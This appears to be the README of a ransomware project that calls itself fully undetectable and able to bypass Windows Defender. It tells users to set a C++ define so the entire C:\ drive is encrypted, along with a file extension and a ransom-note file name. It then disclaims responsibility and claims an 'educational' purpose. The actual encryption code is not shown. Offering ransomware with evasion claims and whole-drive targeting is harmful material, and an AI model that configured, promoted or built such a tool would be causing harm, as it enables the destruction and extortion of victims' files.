# No-Way-Ransomware
This ransomware uses a very simple encrypting method. It's totally FUD (Fully Undetectable), it bypass windows deffender.
#
Edit this strings to what you actually want:
```c++
// Where to encrypt
#define DESTINATION_DIR "C:\\"

// Extension name
#define ENCRYPTED_FILE_NAME ".enc"

// Readme file
#define CONF_FILE_NAME "readme_encrypted_files.txt"
```

I am not responsable for any bad use of the software, all is for educational pruposes.
